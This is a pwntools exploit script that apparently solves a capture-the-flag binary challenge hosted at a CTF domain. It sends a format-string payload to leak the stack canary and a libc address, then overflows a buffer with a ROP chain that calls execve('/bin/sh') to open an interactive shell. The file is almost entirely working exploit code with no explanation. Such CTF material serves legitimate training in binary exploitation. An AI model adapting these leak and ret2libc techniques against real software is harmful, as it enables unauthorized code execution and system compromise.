#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
#libc = '/usr/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'interesting.ctf.prgy.in', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv, env={"LD_PRELOAD": libc.path})

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================

def exploit():
    global io
    io = initialize()
    io.sendlineafter(b"The rules are simple! Say something interesting, and I will give you the flag.", b"%p."*40)
    io.recvuntil("You said: ")
    leak = io.recvline().strip().decode().split(".")

    #Getting leak
    libc_leak = int(leak[31], 16)
    canary = int(leak[39], 16)
    libc.address = libc_leak - libc.sym["_IO_2_1_stdout_"]

    log.info("Canary: %#x", canary)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)

    #Getting shell
    offset = 280
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.execve(next(libc.search("/bin/sh\0")), 0, 0)

    payload = flat({offset: [canary, p32(0) + p32(canary >> 32), rop.chain()]})
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
